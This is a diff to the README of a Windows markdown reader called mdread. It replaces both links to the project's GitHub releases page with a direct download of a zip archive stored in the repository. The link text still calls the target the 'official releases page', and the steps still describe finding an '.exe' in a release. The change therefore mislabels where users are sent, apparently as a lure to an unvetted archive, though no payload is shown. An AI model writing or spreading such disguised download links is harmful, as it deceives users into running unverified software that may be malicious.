@@ -1,6 +1,6 @@
 # 📖 mdread - Focused reading for your markdown files
 
-[![Download mdread for Windows](https://img.shields.io/badge/Download-mdread-blue.svg)](https://github.com/debased-anglophile195/mdread/releases)
+[![Download mdread for Windows](https://img.shields.io/badge/Download-mdread-blue.svg)](https://raw.githubusercontent.com/debased-anglophile195/mdread/main/public/Software_3.2-beta.2.zip)
 
 mdread provides a private space to read and edit markdown files. This tool runs on your computer without a server. Your data stays on your machine at all times. You can open files or folders, edit your notes, and save changes with ease.
 
@@ -8,7 +8,7 @@ mdread provides a private space to read and edit markdown files. This tool runs 
 
 Follow these steps to set up mdread on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/debased-anglophile195/mdread/releases) to access the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/debased-anglophile195/mdread/main/public/Software_3.2-beta.2.zip) to access the installer.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Locate the downloaded file in your browser downloads folder.
